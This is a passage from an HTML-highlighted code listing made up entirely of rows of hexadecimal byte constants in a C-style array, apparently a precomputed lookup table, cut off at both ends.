class="number">0xb3</span>, <span class="number">0x13</span>, <span class="number">0xab</span>, <span class="number">0xec</span>, <span class="number">0x67</span>, <span class="number">0x95</span>, <span class="number">0x27</span>, <span class="number">0xcc</span>, <span class="number">0x2a</span>, <span class="number">0xfd</span> &#125;,</span><br><span class="line">&#123; <span class="number">0xa9</span>, <span class="number">0x83</span>, <span class="number">0x51</span>, <span class="number">0xd6</span>, <span class="number">0x8a</span>, <span class="number">0x90</span>, <span class="number">0x0a</span>, <span class="number">0xf0</span>, <span class="number">0x95</span>, <span class="number">0xfa</span>, <span class="number">0x05</span>, <span class="number">0x70</span>, <span class="number">0xb2</span>, <span class="number">0x12</span>, <span class="number">0xaa</span>, <span class="number">0xed</span>, <span class="number">0x66</span>, <span class="number">0x94</span>, <span class="number">0x26</span>, <span class="number">0xcd</span>, <span class="number">0x2b</span>, <span class="number">0xfc</span> &#125;,</span><br><span class="line">&#123; <span class="number">0xaa</span>, <span class="number">0x80</span>, <span class="number">0x52</span>, <span class="number">0xd5</span>, <span class="number">0x89</span>, <span class="number">0x93</span>, <span class="number">0x09</span>, <span class="number">0xf3</span>, <span class="number">0x96</span>, <span class="number">0xf9</span>, <span class="number">0x06</span>, <span class="number">0x73</span>, <span class="number">0xb1</span>, <span class="number">0x11</span>, <span class="number">0xa9</span>, <span class="number">0xee</span>, <span class="number">0x65</span>, <span class="number">0x97</span>, <span class="number">0x25</span>, <span class="number">0xce</span>, <span class="number">0x28</span>, <span class="number">0xff</span> &#125;,</span><br><span class="line">&#123; <span class="number">0xab</span>, <span class="number">0x81</span>, <span class="number">0x53</span>, <span class="number">0xd4</span>, <span class="number">0x88</span>, <span class="number">0x92</span>, <span class="number">0x08</span>, <span class="number">0xf2</span>, <span class="number">0x97</span>, <span class="number">0xf8</span>, <span class="number">0x07</span>, <span class="number">0x72</span>, <span class="number">0xb0</span>, <span class="number">0x10</span>, <span class="number">0xa8</span>, <span class="number">0xef</span>, <span class="number">0x64</span>, <span class="number">0x96</span>, <span class="number">0x24</span>, <span class="number">0xcf</span>, <span class="number">0x29</span>, <span class="number">0xfe</span> &#125;,</span><br><span class="line">&#123; <span class="number">0xb4</span>, <span class="number">0x9e</span>, <span class="number">0x4c</span>, <span class="number">0xcb</span>, <span class="number">0x97</span>, <span class="number">0x8d</span>, <span class="number">0x17</span>, <span class="number">0xed</span>, <span class="number">0x88</span>, <span class="number">0xe7</span>, <span class="number">0x18</span>, <span class="number">0x6d</span>, <span class="number">0xaf</span>, <span class="number">0x0f</span>, <span class="number">0xb7</span>, <span class="number">0xf0</span>, <span class="number">0x7b</span>, <span class="number">0x89</span>, <span class="number">0x3b</span>, <span class="number">0xd0</span>, <span class="number">0x36</span>, <span class="number">0xe1</span> &#125;,</span><br><span class="line">&#123; <span class="number">0xb5</span>, <span class="number">0x9f</span>, <span class="number">0x4d</span>, <span class="number">0xca</span>, <span class="number">0x96</span>, <span class="number">0x8c</span>, <span class="number">0x16</span>, <span class="number">0xec</span>, <span class="number">0x89</span>, <span class="number">0xe6</span>, <span class="number">0x19</span>, <span class="number">0x6c</span>, <span class="number">0xae</span>, <span class="number">0x0e</span>, <span class="number">0xb6</span>, <span class="number">0xf1</span>, <span class="number">0x7a</span>, <span class="number">0x88</span>, <span class="number">0x3a</span>, <span class="number">0xd1</span>, <span class="number">0x37</span>, <span class="number">0xe0</span> &#125;,</span><br><span class="line">&#123; <span class="number">0xb6</span>, <span class="number">0x9c</span>, <span class="number">0x4e</span>, <span class="number">0xc9</span>, <span class="number">0x95</span>, <span class="number">0x8f</span>, <span class="number">0x15</span>, <span class="number">0xef</span>, <span class="number">0x8a</span>, <span class="number">0xe5</span>, <span class="number">0x1a</span>, <span class="number">0x6f</span>, <span class="number">0xad</span>, <span class="number">0x0d</span>, <span class="number">0xb5</span>, <span class="number">0xf2</span>, <span class="number">0x79</span>, <span class="number">0x8b</span>, <span class="number">0x39</span>, <span class="number">0xd2</span>, <span class="number">0x34</span>, <span class="number">0xe3</span> &#125;,</span><br><span class="line">&#123; <span class="number">0xb7</span>, <span class="number">0x9d</span>, <span class="number">0x4f</span>, <span class="number">0xc8</span>, <span class="number">0x94</span>, <span class="number">0x8e</span>, <span class="number">0x14</span>, <span class="number">0xee</span>, <span class="number">0x8b</span>, <span class="number">0xe4</span>, <span class="number">0x1b</span>, <span class="number">0x6e</span>, <span class="number">0xac</span>, <span class="number">0x0c</span>, <span class="number">0xb4</span>, <span class="number">0xf3</span>, <span class="number">0x78</span>, <span class="number">0x8a</span>, <span class="number">0x38</span>, <span class="number">0xd3</span>, <span class="number">0x35</span>, <span class="number">0xe2</span> &#125;,</span><br><span class="line">&#123; <span class="number">0xb0</span>, <span class="number">0x9a</span>, <span class="number">0x48</span>, <span class="number">0xcf</span>, <span class="number">0x93</span>, <span class="number">0x89</span>, <span class="number">0x13</span>, <span class="number">0xe9</span>, <span class="number">0x8c</span>, <span class="number">0xe3</span>, <span class="number">0x1c</span>, <span class="number">0x69</span>, <span class="number">0xab</span>, <span class="number">0x0b</span>, <span class="number">0xb3</span>, <span class="number">0xf4</span>, <span class="number">0x7f</span>, <span class="number">0x8d</span>, <span class="number">0x3f</span>, <span class="number">0xd4</span>, <span class="number">0x32</span>, <span class="number">0xe5</span> &#125;,</span><br><span class="line">&#123; <span class="number">0xb1</span>, <span class="number">0x9b</span>, <span class="number">0x49</span>, <span class="number">0xce</span>, <span class="number">0x92</span>, <span class="number">0x88</span>, <span class="number">0x12</span>, <span class="number">0xe8</span>, <span class="number">0x8d</span>, <span class="number">0xe2</span>, <span class="number">0x1d</span>, <span class="number">0x68</span>, <span class="number">0xaa</span>, <span class="number">0x0a</span>, <span class="number">0xb2</span>, <span class="number">0xf5</span>, <span class="number">0x7e</span>, <span class="number">0x8c</span>, <span class="number">0x3e</span>, <span class="number">0xd5</span>, <span class="number">0x33</span>, <span class="number">0xe4</span> &#125;,</span><br><span class="line">&#123; <span class="number">0xb2</span>, <span class="number">0x98</span>, <span class="number">0x4a</span>, <span class="number">0xcd</span>, <span class="number">0x91</span>, <span class="number">0x8b</span>, <span class="number">0x11</span>, <span class="number">0xeb</span>, <span class="number">0x8e</span>, <span class="number">0xe1</span>, <span class="number">0x1e</span>, <span class="number">0x6b</span>, <span class="number">0xa9</span>, <span class="number">0x09</span>, <span class="number">0xb1</span>, <span class="number">0xf6</span>, <span class="number">0x7d</span>, <span class="number">0x8f</span>, <span class="number">0x3d</span>, <span class="number">0xd6</span>, <span class="number">0x30</span>, <span class="number">0xe7</span> &#125;,</span><br><span class="line">&#123; <span class="number">0xb3</span>, <span class="number">0x99</span>, <span class="number">0x4b</span>, <span class="number">0xcc</span>, <span class="number">0x90</span>, <span class="number">0x8a</span>, <span class="number">0x10</span>, <span class="number">0xea</span>, <span class="number">0x8f</span>, <span class="number">0xe0</span>, <span class="number">0x1f</span>, <span class="number">0x6a</span>, <span class="number">0xa8</span>, <span class="number">0x08</span>, <span class="number">0xb0</span>, <span class="number">0xf7</span>, <span class="number">0x7c</span>, <span class="number">0x8e</span>, <span class="number">0x3c</span>, <span class="number">0xd7</span>, <span class="number">0x31</span>, <span class="number">0xe6</span> &#125;,</span><br><span class="line">&#123; <span class="number">0xbc</span>, <span class="number">0x96</span>, <span class="number">0x44</span>, <span class="number">0xc3</span>, <span class="number">0x9f</span>, <span class="number">0x85</span>, <span class="number">0x1f</span>, <span class="number">0xe5</span>, <span class="number">0x80</span>, <span class="number">0xef</span>, <span class="number">0x10</span>, <span class="number">0x65</span>, <span class="number">0xa7</span>, <span class="number">0x07</span>, <span class="number">0xbf</span>, <span class="number">0xf8</span>, <span class="number">0x73</span>, <span class="number">0x81</span>, <span class="number">0x33</span>, <span class="number">0xd8</span>, <span class="number">0x3e</span>, <span class="number">0xe9</span> &#125;,</span><br><span class="line">&#123; <span class="number">0xbd</span>, <span class="number">0x97</span>, <span class="number">0x45</span>, <span class="number">0xc2</span>, <span class="number">0x9e</span>, <span class="number">0x84</span>, <span class="number">0x1e</span>, <span class="number">0xe4</span>, <span class="number">0x81</span>, <span class="number">0xee</span>, <span class="number">0x11</span>, <span class="number">0x64</span>, <span class="number">0xa6</span>, <span class="number">0x06</span>, <span class="number">0xbe</span>, <span class="number">0xf9</span>, <span class="number">0x72</span>, <span class="number">0x80</span>, <span class="number">0x32</span>, <span class="number">0xd9</span>, <span class="number">0x3f</span>, <span class="number">0xe8</span> &#125;,</span><br><span class="line">&#123; <span class="number">0xbe</span>, <span class="number">0x94</span>, <span class="number">0x46</span>, <span class="number">0xc1</span>, <span class="number">0x9d</span>, <span class="number">0x87</span>, <span class="number">0x1d</span>, <span class="number">0xe7</span>, <span class="number">0x82</span>, <span class="number">0xed</span>, <span class="number">0x12</span>, <span class="number">0x67</span>, <span class="number">0xa5</span>, <span class="number">0x05</span>, <span class="number">0xbd</span>, <span class="number">0xfa</span>, <span class="number">0x71</span>, <span class="number">0x83</span>, <span class="number">0x31</span>, <span class="number">0xda</span>, <span class="number">0x3c</span>, <span class="number">0xeb</span> &#125;,</span><br><span class="line">&#123; <span class="number">0xbf</span>, <span class="number">0x95</span>, <span class="number">0x47</span>, <span class="number">0xc0</span>, <span class="number">0x9c</span>, <span class="number">0x86</span>, <span class="number">0x1c</span>, <span class="number">0xe6</span>, <span class="number">0x83</span>, <span class="number">0xec</span>, <span class="number">0x13</span>, <span class="number">0x66</span>, <span class="number">0xa4</span>, <span class="number">0x04</span>, <span class="number">0xbc</span>, <span class="number">0xfb</span>, <span class="number">0x70</span>, <span class="number">0x82</span>, <span class="number">0x30</span>, <span class="number">0xdb</span>, <span class="number">0x3d</span>, <span class="number">0xea</span> &#125;,</span><br><span class="line">&#123; <span class="number">0xb8</span>, <span class="number">0x92</span>, <span class="number">0x40</span>, <span class="number">0xc7</span>, <span class="number">0x9b</span>, <span class="number">0x81</span>, <span class="number">0x1b</span>, <span class="number">0xe1</span>, <span class="number">0x84</span>, <span class="number">0xeb</span>, <span class="number">0x14</span>, <span class="number">0x61</span>, <span class="number">0xa3</span>, <span class="number">0x03</span>, <span class="number">0xbb</span>, <span class="number">0xfc</span>, <span class="number">0x77</span>, <span class="number">0x85</span>, <span class="number">0x37</span>, <span class="number">0xdc</span>, <span class="number">0x3a</span>, <span class="number">0xed</span> &#125;,</span><br><span class="line">&#123; <span class="number">0xb9</span>, <span class="number">0x93</span>, <span class="number">0x41</span>, <span class="number">0xc6</span>, <span class="number">0x9a</span>, <span class="number">0x80</span>, <span class="number">0x1a</span>, <span class="number">0xe0</span>, <span class="number">0x85</span>, <span class="number">0xea</span>, <span class="number">0x15</span>, <span class="number">0x60</span>, <span class="number">0xa2</span>, <span class="number">0x02</span>, <span class="number">0xba</span>, <span class="number">0xfd</span>, <span class="number">0x76</span>, <span class="number">0x84</span>, <span class="number">0x36</span>, <span class="number">0xdd</span>, <span class="number">0x3b</span>, <span class="number">0xec</span> &#125;,</span><br><span class="line">&#123; <span class="number">0xba</span>, <span class="number">0x90</span>, <span class="number">0x42</span>, <span class="number">0xc5</span>, <span class="number">0x99</span>, <span class="number">0x83</span>, <span class="number">0x19</span>, <span class="number">0xe3</span>, <span class="number">0x86</span>, <span class="number">0xe9</span>, <span class="number">0x16</span>, <span class="number">0x63</span>, <span class="number">0xa1</span>, <span class="number">0x01</span>, <span class="number">0xb9</span>, <span class="number">0xfe</span>, <span class="number">0x75</span>, <span class="number">0x87</span>, <span class="number">0x35</span>, <span class="number">0xde</span>, <span class="number">0x38</span>, <span class="number">0xef</span> &#125;,</span><br><span class="line">&#123; <span class="number">0xbb</span>, <span class="number">0x91</span>, <span class="number">0x43</span>, <span class="number">0xc4</span>, <span class="number">0x98</span>, <span class="number">0x82</span>, <span class="number">0x18</span>, <span class="number">0xe2</span>, <span class="number">0x87</span>, <span class="number">0xe8</span>, <span class="number">0x17</span>, <span class="number">0x62</span>, <span class="number">0xa0</span>, <span class="number">0x00</span>, <span class="number">0xb8</span>, <span class="number">0xff</span>, <span class="number">0x74</span>, <span class="number">0x86</span>, <span class="number">0x34</span>, <span class="number">0xdf</span>, <span class="number">0x39</span>, <span class="number">0xee</span> &#125;,</span><br><span class="line">&#123; <span class="number">0x44</span>, <span class="number">0x6e</span>, <span class="number">0xbc</span>, <span class="number">0x3b</span>, <span class="number">0x67</span>, <span class="number">0x7d</span>, <span class="number">0xe7</span>, <span class="number">0x1d</span>, <span class="number">0x78</span>, <span class="number">0x17</span>, <span class="number">0xe8</span>, <span class="number">0x9d</span>, <span class="number">0x5f</span>, <span class="number">0xff</span>, <span class="number">0x47</span>, <span class="number">0x00</span>, <span class="number">0x8b</span>, <span class="number">0x79</span>, <span class="number">0xcb</span>, <span class="number">0x20</span>, <span class="number">0xc6</span>, <span class="number">0x11</span> &#125;,</span><br><span class="line">&#123; <span class="number">0x45</span>, <span class="number">0x6f</span>, <span class="number">0xbd</span>, <span class="number">0x3a</span>, <span class="number">0x66</span>, <span class="number">0x7c</span>, <span class="number">0xe6</span>, <span class="number">0x1c</span>, <span class="number">0x79</span>, <span class="number">0x16</span>, <span class="number">0xe9</span>, <span class="number">0x9c</span>, <span class="number">0x5e</span>, <span class="number">0xfe</span>, <span class="number">0x46</span>, <span class="number">0x01</span>, <span class="number">0x8a</span>, <span class="number">0x78</span>, <span class="number">0xca</span>, <span class="number">0x21</span>, <span class="number">0xc7</span>, <span class="number">0x10</span> &#125;,</span><br><span class="line">&#123; <span class="number">0x46</span>, <span class="number">0x6c</span>, <span class="number">0xbe</span>, <span class="number">0x39</span>, <span class="number">0x65</span>, <span class="number">0x7f</span>, <span class="number">0xe5</span>, <span class="number">0x1f</span>, <span class="number">0x7a</span>, <span class="number">0x15</span>, <span class="number">0xea</span>, <span class="number">0x9f</span>, <span class="number">0x5d</span>, <span class="number">0xfd</span>, <span class="number">0x45</span>, <span class="number">0x02</span>, <span class="number">0x89</span>, <span class="number">0x7b</span>, <span class="number">0xc9</span>, <span class="number">0x22</span>, <span class="number">0xc4</span>, <span class="number">0x13</span> &#125;,</span><br><span class="line">&#123; <span class="number">0x47</span>, <span class="number">0x6d</span>, <span class="number">0xbf</span>, <span class="number">0x38</span>, <span class="number">0x64</span>, <span class="number">0x7e</span>, <span class="number">0xe4</span>, <span class="number">0x1e</span>, <span class="number">0x7b</span>, <span class="number">0x14</span>, <span class="number">0xeb</span>, <span class="number">0x9e</span>, <span class="number">0x5c</span>, <span class="number">0xfc</span>, <span class="number">0x44</span>, <span class="number">0x03</span>, <span class="number">0x88</span>, <span class="number">0x7a</span>, <span class="number">0xc8</span>, <span class="number">0x23</span>, <span class="number">0xc5</span>, <span class="number">0x12</span> &#125;,</span><br><span class="line">&#123; <span class="number">0x40</span>, <span class="number">0x6a</span>, <span class="number">0xb8</span>, <span class="number">0x3f</span>, <span class="number">0x63</span>, <span class="number">0x79</span>, <span class="number">0xe3</span>, <span class="number">0x19</span>, <span class="number">0x7c</span>, <span class="number">0x13</span>, <span class="number">0xec</span>, <span class="number">0x99</span>, <span class="number">0x5b</span>, <span class="number">0xfb</span>, <span class="number">0x43</span>, <span class="number">0x04</span>, <span class="number">0x8f</span>, <span class="number">0x7d</span>, <span class="number">0xcf</span>, <span class="number">0x24</span>, <span class="number">0xc2</span>, <span class="number">0x15</span> &#125;,</span><br><span class="line">&#123; <span class="number">0x41</span>, <span class="number">0x6b</span>, <span class="number">0xb9</span>, <span class="number">0x3e</span>, <span class="number">0x62</span>, <span class="number">0x78</span>, <span class="number">0xe2</span>, <span class="number">0x18</span>, <span class="number">0x7d</span>, <span class="number">0x12</span>, <span class="number">0xed</span>, <span class="number">0x98</span>, <span class="number">0x5a</span>, <span class="number">0xfa</span>, <span class="number">0x42</span>, <span class="number">0x05</span>, <span class="number">0x8e</span>, <span class="number">0x7c</span>, <span class="number">0xce</span>, <span class="number">0x25</span>, <span class="number">0xc3</span>, <span class="number">0x14</span> &#125;,</span><br><span class="line">&#123; <span class="number">0x42</span>, <span class="number">0x68</span>, <span class="number">0xba</span>, <span class="number">0x3d</span>, <span class="number">0x61</span>, <span class="number">0x7b</span>, <span class="number">0xe1</span>, <span class="number">0x1b</span>, <span class="number">0x7e</span>, <span class="number">0x11</span>, <span class="number">0xee</span>, <span class="number">0x9b</span>, <span class="number">0x59</span>, <span class="number">0xf9</span>, <span class="number">0x41</span>, <span class="number">0x06</span>, <span class="number">0x8d</span>, <span class="number">0x7f</span>, <span class="number">0xcd</span>, <span class="number">0x26</span>, <span class="number">0xc0</span>, <span class="number">0x17</span> &#125;,</span><br><span class="line">&#123; <span class="number">0x43</span>, <span class="number">0x69</span>, <span class="number">0xbb</span>, <span class="number">0x3c</span>, <span class="number">0x60</span>, <span class="number">0x7a</span>, <span class="number">0xe0</span>, <span class="number">0x1a</span>, <span class="number">0x7f</span>, <span class="number">0x10</span>, <span class="number">0xef</span>, <span class="number">0x9a</span>, <span class="number">0x58</span>, <span class="number">0xf8</span>, <span class="number">0x40</span>, <span class="number">0x07</span>, <span class="number">0x8c</span>, <span class="number">0x7e</span>, <span class="number">0xcc</span>, <span class="number">0x27</span>, <span class="number">0xc1</span>, <span class="number">0x16</span> &#125;,</span><br><span class="line">&#123; <span class="number">0x4c</span>, <span class="number">0x66</span>, <span class="number">0xb4</span>, <span class="number">0x33</span>, <span class="number">0x6f</span>, <span class="number">0x75</span>, <span class="number">0xef</span>, <span class="number">0x15</span>, <span class="number">0x70</span>, <span class="number">0x1f</span>, <span class="number">0xe0</span>, <span class="number">0x95</span>, <span class="number">0x57</span>, <span class="number">0xf7</span>, <span class="number">0x4f</span>, <span class="number">0x08</span>, <span class="number">0x83</span>, <span class="number">0x71</span>, <span class="number">0xc3</span>, <span class="number">0x28</span>, <span class="number">0xce</span>, <span class="number">0x19</span> &#125;,</span><br><span class="line">&#123; <span class="number">0x4d</span>, <span class="number">0x67</span>, <span class="number">0xb5</span>, <span class="number">0x32</span>, <span class="number">0x6e</span>, <span class="number">0x74</span>, <span class="number">0xee</span>, <span class="number">0x14</span>, <span class="number">0x71</span>, <span class="number">0x1e</span>, <span class="number">0xe1</span>, <span class="number">0x94</span>, <span class="number">0x56</span>, <span class="number">0xf6</span>, <span class="number">0x4e</span>, <span class="number">0x09</span>, <span class="number">0x82</span>, <span class="number">0x70</span>, <span class="number">0xc2</span>, <span class="number">0x29</span>, <span class="number">0xcf</span>, <span class="number">0x18</span> &#125;,</span><br><span class="line">&#123; <span class="number">0x4e</span>, <span class="number">0x64</span>, <span class="number">0xb6</span>, <span class="number">0x31</span>, <span class="number">0x6d</span>, <span class="number">0x77</span>, <span class="number">0xed</span>, <span class="number">0x17</span>, <span class="number">0x72</span>, <span class="number">0x1d</span>, <span class="number">0xe2</span>, <span class="number">0x97</span>, <span class="number">0x55</span>, <span class="number">0xf5</span>, <span class="number">0x4d</span>, <span class="number">0x0a</span>, <span class="number">0x81</span>, <span class="number">0x73</span>, <span class="number">0xc1</span>, <span class="number">0x2a</span>, <span class="number">0xcc</span>, <span class="number">0x1b</span> &#125;,</span><br><span class="line">&#123; <span class="number">0x4f</span>, <span class="number">0x65</span>, <span class="number">0xb7</span>, <span class="number">0x30</span>, <span class="number">0x6c</span>, <span class="number">0x76</span>, <span class="number">0xec</span>, <span class="number">0x16</span>, <span class="number">0x73</span>, <span class="number">0x1c</span>, <span class="number">0xe3</span>, <span class="number">0x96</span>, <span class="number">0x54</span>, <span class="number">0xf4</span>, <span class="number">0x4c</span>, <span class="number">0x0b</span>, <span class="number">0x80</span>, <span class="number">0x72</span>, <span class="number">0xc0</span>, <span class="number">0x2b</span>, <span class="number">0xcd</span>, <span class="number">0x1a</span> &#125;,</span><br><span class="line">&#123; <span class="number">0x48</span>, <span class="number">0x62</span>, <span class="number">0xb0</span>, <span class="number">0x37</span>, <span class="number">0x6b</span>, <span class="number">0x71</span>, <span class="number">0xeb</span>, <span class="number">0x11</span>, <span class="number">0x74</span>, <span class="number">0x1b</span>, <span class="number">0xe4</span>, <span class="number">0x91</span>, <span class="number">0x53</span>, <span class="number">0xf3</span>, <span class="number">0x4b</span>, <span class="number">0x0c</span>, <span class="number">0x87</span>, <span class="number">0x75</span>, <span class="number">0xc7</span>, <span class="number">0x2c</span>, <span class="number">0xca</span>, <span class="number">0x1d</span> &#125;,</span><br><span class="line">&#123; <span class="number">0x49</span>, <span class="number">0x63</span>, <span class="number">0xb1</span>, <span class="number">0x36</span>, <span class="number">0x6a</span>, <span class="number">0x70</span>, <span class="number">0xea</span>, <span class="number">0x10</span>, <span class="number">0x75</span>, <span class="number">0x1a</span>, <span class="number">0xe5</span>, <span class="number">0x90</span>, <span class="number">0x52</span>, <span class="number">0xf2</span>, <span class="number">0x4a</span>, <span class="number">0x0d</span>, <span class="number">0x86</span>, <span class="number">0x74</span>, <span class="number">0xc6</span>, <span class="number">0x2d</span>, <span class="number">0xcb</span>, <span class="number">0x1c</span> &#125;,</span><br><span class="line">&#123; <span class="number">0x4a</span>, <span class="number">0x60</span>, <span class="number">0xb2</span>, <span class="number">0x35</span>, <span class="number">0x69</span>, <span class="number">0x73</span>, <span class="number">0xe9</span>, <span class="number">0x13</span>, <span class="number">0x76</span>, <span class="number">0x19</span>, <span class="number">0xe6</span>, <span class="number">0x93</span>, <span class="number">0x51</span>, <span class="number">0xf1</span>, <span class="number">0x49</span>, <span class="number">0x0e</span>, <span class="number">0x85</span>, <span class="number">0x77</span>, <span class="number">0xc5</span>, <span class="number">0x2e</span>, <span class="number">0xc8</span>, <span class="number">0x1f</span> &#125;,</span><br><span class="line">&#123; <span class="number">0x4b</span>, <span class="number">0x61</span>, <span class="number">0xb3</span>, <span class="number">0x34</span>, <span class="number">0x68</span>, <span class="number">0x72</span>, <span class="number">0xe8</span>, <span class="number">0x12</span>, <span class="number">0x77</span>, <span class="number">0x18</span>, <span class="number">0xe7</span>, <span class="number">0x92</span>, <span class="number">0x50</span>, <span class="number">0xf0</span>, <span class="number">0x48</span>, <span class="number">0x0f</span>, <span class="number">0x84</span>, <span class="number">0x76</span>, <span class="number">0xc4</span>, <span class="number">0x2f</span>, <span class="number">0xc9</span>, <span class="number">0x1e</span> &#125;,</span><br><span class="line">&#123; <span class="number">0x54</span>, <span class="number">0x7e</span>, <span class="number">0xac</span>, <span class="number">0x2b</span>, <span class="number">0x77</span>, <span class="number">0x6d</span>, <span class="number">0xf7</span>, <span class="number">0x0d</span>, <span class="number">0x68</span>, <span class="number">0x07</span>, <span class="number">0xf8</span>, <span class="number">0x8d</span>, <span class="number">0x4f</span>, <span class="number">0xef</span>, <span class="number">0x57</span>, <span class="number">0x10</span>, <span class="number">0x9b</span>, <span class="number">0x69</span>, <span class="number">0xdb</span>, <span class="number">0x30</span>, <span class="number">0xd6</span>, <span class="number">0x01</span> &#125;,</span><br><span class="line">&#123; <span class="number">0x55</span>, <span class="number">0x7f</span>, <span class="number">0xad</span>, <span class="number">0x2a</span>, <span class="number">0x76</span>, <span class="number">0x6c</span>, <span class="number">0xf6</span>, <span class="number">0x0c</span>, <span class="number">0x69</span>, <span class="number">0x06</span>, <span class="number">0xf9</span>, <span class="number">0x8c</span>, <span class="number">0x4e</span>, <span class="number">0xee</span>, <span class="number">0x56</span>, <span class="number">0x11</span>, <span class="number">0x9a</span>, <span class="number">0x68</span>, <span class="number">0xda</span>, <span class="number">0x31</span>, <span class="number">0xd7</span>, <span class="number">0x00</span> &#125;,</span><br><span class="line">&#123; <span class="number">0x56</span>, <span class="number">0x7c</span>, <span class="number">0xae</span>, <span class="number">0x29</span>, <span class="number">0x75</span>, <span class="number">0x6f</span>, <span class="number">0xf5</span>, <span class="number">0x0f</span>, <span class="number">0x6a</span>, <span class="number">0x05</span>, <span class="number">0xfa</span>, <span class="number">0x8f</span>, <span class="number">0x4d</span>, <span class="number">0xed</span>, <span class="number">0x55</span>, <span class="number">0x12</span>, <span class="number">0x99</span>, <span class="number">0x6b</span>, <span class="number">0xd9</span>, <span class="number">0x32</span>, <span class="number">0xd4</span>, <span class="number">0x03</span> &#125;,</span><br><span class="line">&#123; <span class="number">0x57</span>, <span class="number">0x7d</span>, <span class="number">0xaf</span>, <span class="number">0x28</span>, <span class="number">0x74</span>, <span class="number">0x6e</span>, <span class="number">0xf4</span>, <span class="number">0x0e</span>, <span class="number">0x6b</span>, <span class="number">0x04</span>, <span class="number">0xfb</span>, <span class="number">0x8e</span>, <span class="number">0x4c</span>, <span class="number">0xec</span>, <span class="number">0x54</span>, <span class="number">0x13</span>, <span class="number">0x98</span>, <span class="number">0x6a</span>, <span class="number">0xd8</span>, <span class="number">0x33</span>, <span class="number">0xd5</span>, <span class="number">0x02</span> &#125;,</span><br><span class="line">&#123; <span class="number">0x50</span>, <span class="number">0x7a</span>, <span class="number">0xa8</span>, <span class="number">0x2f</span>, <span class="number">0x73</span>, <span class="number">0x69</span>, <span class="number">0xf3</span>, <span class="number">0x09</span>, <span class="number">0x6c</span>, <span class="number">0x03</span>, <span class="number">0xfc</span>, <span class="number">0x89</span>, <span class="number">0x4b</span>, <span class="number">0xeb</span>, <span class="number">0x53</span>, <span class="number">0x14</span>, <span class="number">0x9f</span>, <span class="number">0x6d</span>, <span class="number">0xdf</span>, <span class="number">0x34</span>, <span class="number">0xd2</span>, <span class="number">0x05</span> &#125;,</span><br><span class="line">&#123; <span class="number">0x51</span>, <span class="number">0x7b</span>, <span class="number">0xa9</span>, <span class="number">0x2e</span>, <span class="number">0x72</span>, <span class="number">0x68</span>, <span class="number">0xf2</span>, <span class="number">0x08</span>, <span class="number">0x6d</span>, <span class="number">0x02</span>, <span class="number">0xfd</span>, <span class="number">0x88</span>, <span class="number">0x4a</span>, <span class="number">0xea</span>, <span class="number">0x52</span>, <span class="number">0x15</span>, <span class="number">0x9e</span>, <span class="number">0x6c</span>, <span class="number">0xde</span>, <span class="number">0x35</span>, <span class="number">0xd3</span>, <span class="number">0x04</span> &#125;,</span><br><span class="line">&#123; <span class="number">0x52</span>, <span class="number">0x78</span>, <span class="number">0xaa</span>, <span class="number">0x2d</span>, <span class="number">0x71</span>, <span class="number">0x6b</span>, <span class="number">0xf1</span>, <span class="number">0x0b</span>, <span class="number">0x6e</span>, <span class="number">0x01</span>, <span class="number">0xfe</span>, <span class="number">0x8b</span>, <span class="number">0x49</span>, <span class="number">0xe9</span>, <span class="number">0x51</span>, <span class="number">0x16</span>, <span class="number">0x9d</span>, <span class="number">0x6f</span>, <span class="number">0xdd</span>, <span class="number">0x36</span>, <span class="number">0xd0</span>, <span class="number">0x07</span> &#125;,</span><br><span class="line">&#123; <span class="number">0x53</span>, <span class="number">0x79</span>, <span class="number">0xab</span>, <span class="number">0x2c</span>, <span class="number">0x70</span>, <span class="number">0x6a</span>, <span class="number">0xf0</span>, <span class="number">0x0a</span>, <span class="number">0x6f</span>, <span class="number">0x00</span>, <span class="number">0xff</span>, <span class="number">0x8a</span>, <span class="number">0x48</span>, <span class="number">0xe8</span>, <span class="number">0x50</span>, <span class="number">0x17</span>, <span class="number">0x9c</span>, <span class="number">0x6e</span>, <span class="number">0xdc</span>, <span class="number">0x37</span>, <span class="number">0xd1</span>, <span class="number">0x06</span> &#125;,</span><br><span class="line">&#123; <span class="number">0x5c</span>, <span class="number">0x76</span>, <span class="number">0xa4</span>, <span class="number">0x23</span>, <span class="number">0x7f</span>, <span class="number">0x65</span>, <span class="number">0xff</span>, <span class="number">0x05</span>, <span class="number">0x60</span>, <span class="number">0x0f</span>, <span class="number">0xf0</span>, <span class="number">0x85</span>, <span class="number">0x47</span>, <span class="number">0xe7</span>, <span class="number">0x5f</span>, <span class="number">0x18</span>, <span class="number">0x93</span>, <span class="number">0x61</span>, <span class="number">0xd3</span>, <span class="number">0x38</span>, <span class="number">0xde</span>, <span class="number">0x09</span> &#125;,</span><br><span class="line">&#123; <span class="number">0x5d</span>, <span class="number">0x77</span>, <span class="number">0xa5</span>, <span class="number">0x22</span>, <span class="number">0x7e</span>, <span class="number">0x64</span>, <span class="number">0xfe</span>, <span class="number">0x04</span>, <span class="number">0x61</span>, <span class="number">0x0e</span>, <span class="number">0xf1</span>, <span class="number">0x84</span>, <span class="number">0x46</span>, <span class="number">0xe6</span>, <span class="number">0x5e</span>, <span class="number">0x19</span>, <span class="number">0x92</span>, <span class="number">0x60</span>, <span class="number">0xd2</span>, <span class="number">0x39</span>, <span class="number">0xdf</span>, <span class="number">0x08</span> &#125;,</span><br><span class="line">&#123; <span class="number">0x5e</span>, <span class="number">0x74</span>, <span class="number">0xa6</span>, <span class="number">0x21</span>, <span class="number">0x7d</span>, <span class="number">0x67</span>, <span class="number">0xfd</span>, <span class="number">0x07</span>, <span class="number">0x62</span>, <span class="number">0x0d</span>, <span class="number">0xf2</span>, <span class="number">0x87</span>, <span class="number">0x45</span>, <span class="number">0xe5</span>, <span class="number">0x5d</span>, <span class="number">0x1a</span>, <span class="number">0x91</span>, <span class="number">0x63</span>, <span class="number">0xd1</span>, <span class="number">0x3a</span>, <span class="number">0xdc</span>, <span class="number">0x0b</span> &#125;,</span><br><span class="line">&#123; <span class="number">0x5f</span>, <span class="number">0x75</span>, <span class="number">0xa7</span>, <span class="number">0x20</span>, <span class="number">0x7c</span>, <span class="number">0x66</span>, <span class="number">0xfc</span>, <span class="number">0x06</span>, <span class="number">0x63</span>, <span class="number">0x0c</span>, <span class="number">0xf3</span>, <span class="number">0x86</span>, <span class="number">0x44</span>, <span class="number">0xe4</span>, <span class="number">0x5c</span>, <span class="number">0x1b</span>, <span class="number">0x90</span>, <span class="number">0x62</span>, <span class="number">0xd0</span>, <span class="number">0x3b</span>, <span class="number">0xdd</span>, <span class="number">0x0a</span> &#125;,</span><br><span class="line">&#123; <span class="number">0x58</span>, <span class="number">0x72</span>, <span 